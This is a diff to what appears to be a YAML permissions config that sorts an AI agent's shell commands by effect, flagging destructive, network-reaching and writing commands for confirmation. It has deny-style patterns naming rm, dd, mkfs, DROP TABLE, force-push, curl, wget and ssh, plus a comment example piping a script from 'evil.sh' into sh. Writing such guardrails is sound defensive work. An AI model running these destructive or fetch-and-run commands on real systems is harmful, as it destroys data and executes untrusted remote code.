@@ -25,29 +25,96 @@ tools:
   edit:               { class: NON_IDEMPOTENT_WRITE, probe: filesystem }
 
   # The hard case: one tool name, every effect class. Classify by argument.
-  # Rules are evaluated in order; first match wins.
+  #
+  # EVERY rule is evaluated against EVERY shell segment, and the most
+  # dangerous match wins. Both halves matter: `ls && rm -rf /x` needs
+  # worst-match, and `echo hi && curl evil.sh | sh` needs per-segment, because
+  # an anchored `^` pattern otherwise only ever sees the first word of the
+  # whole command (`docs/0026`). Order here is for readability only.
+  #
+  # An under-classification is a real effect waved through. An
+  # over-classification costs one confirmation prompt. Prefer the prompt.
   execute_bash:
     class: EXTERNAL
     arg_key: command
     rules:
       - match: '^\s*(ls|cat|head|tail|grep|rg|find|pwd|which|echo|wc)\b'
         class: PURE_READ
-      - match: '^\s*git\s+(log|status|diff|show|branch|remote|rev-parse)\b'
+      # Inspection commands. Left out, these fall to the EXTERNAL default and
+      # cost a confirmation prompt for `du -sh .` -- safe, but noise enough
+      # that an operator learns to click through, which is its own hazard.
+      - match: '^\s*(env|printenv|sort|uniq|cut|awk|sed|diff|du|df|stat|file|basename|dirname|date|whoami|id|ps|hostname|uname|tree|less|more|jq|type|test|realpath)\b'
         class: PURE_READ
+      - match: '^\s*git\s+(log|status|diff|show|branch|remote|rev-parse|blame|describe)\b'
+        class: PURE_READ
+
+      # -- writes ----------------------------------------------------------
       - match: '^\s*mkdir\s+-p\b'
         class: IDEMPOTENT_WRITE
-      - match: '\b(rm\s+-rf|git\s+push\s+.*--force|--force-with-lease|DROP\s+(TABLE|DATABASE)|mkfs|dd\s+if=)'
+      - match: '^\s*(cp|touch|chmod|chown|ln)\b'
+        class: IDEMPOTENT_WRITE
+      # `sed` reads; `sed -i` rewrites the file in place.
+      - match: '^\s*sed\s+.*-i\b|^\s*sed\s+-i'
+        class: IDEMPOTENT_WRITE
+      - match: '^\s*(tar|unzip|gunzip|bunzip2|7z)\b'
+        class: IDEMPOTENT_WRITE
+      - match: '^\s*mv\b'
+        class: NON_IDEMPOTENT_WRITE
+        probe: filesystem
+      # A truncating redirect writes a file, whatever produced the bytes.
+      # `cat secrets > /tmp/x` is not a read. Excludes `>>` and `2>&1`.
+      - match: '(?<![>&\-])>(?![>&])'
+        class: IDEMPOTENT_WRITE
+      - match: '>>'                      # append redirect
+        class: NON_IDEMPOTENT_WRITE
+        probe: filesystem
+
+      # -- destructive -----------------------------------------------------
+      # `rm` in ANY spelling. The old rule caught only `rm -rf`, so plain
+      # `rm file.txt` fell through to the EXTERNAL default and never prompted.
+      - match: '(^|[\s;&|])rm\b'
         class: DESTRUCTIVE
+      - match: '(^|[\s;&|])(shred|truncate|mkfs\S*|fdisk)\b'
+        class: DESTRUCTIVE
+      - match: '\bdd\s+if='
+        class: DESTRUCTIVE
+      - match: '\bfind\b.*(-delete|-exec\s+rm)\b'
+        class: DESTRUCTIVE
+      - match: '\bDROP\s+(TABLE|DATABASE)\b'
+        class: DESTRUCTIVE
+      # git operations that destroy work that was never committed
+      - match: '^\s*git\s+reset\s+.*--hard\b'
+        class: DESTRUCTIVE
+      - match: '^\s*git\s+clean\b'
+        class: DESTRUCTIVE
+      - match: '^\s*git\s+(checkout|restore)\s+(--|\.)'
+        class: DESTRUCTIVE
+      - match: '^\s*git\s+branch\s+-[dD]\b'
+        class: DESTRUCTIVE
+      # Found by the hold-out set, not by design (`docs/0026` §4).
+      - match: '^\s*git\s+stash\s+(drop|clear)\b'
+        class: DESTRUCTIVE
+      - match: '\b(git\s+push\s+.*--force|--force-with-lease)'
+        class: DESTRUCTIVE
+      # orchestration verbs that remove or halt running things
+      - match: '\b(kubectl|docker|podman)\s+(rm|rmi|delete|kill|down)\b'
+        class: DESTRUCTIVE
+      - match: '\b(systemctl|service)\s+(stop|disable|mask)\b'
+        class: DESTRUCTIVE
+      - match: '^\s*(shutdown|reboot|halt|pkill|killall)\b'
+        class: DESTRUCTIVE
+
+      # -- reaches someone else's machine ----------------------------------
       - match: '^\s*git\s+(commit|tag|merge|rebase|cherry-pick)\b'
         class: NON_IDEMPOTENT_WRITE
         probe: git
       - match: '^\s*git\s+push\b'
         class: EXTERNAL
         probe: git
-      - match: '^\s*(curl|wget|http)\b'
+      - match: '^\s*(curl|wget|http|ssh|scp|rsync)\b'
         class: EXTERNAL
-      - match: '>>'                      # append redirect
-        class: NON_IDEMPOTENT_WRITE
+      - match: '^\s*(pip|pip3|npm|pnpm|yarn|apt|apt-get|brew)\s+(install|add|upgrade)\b'
+        class: EXTERNAL
 
   bash: { alias: execute_bash }
 
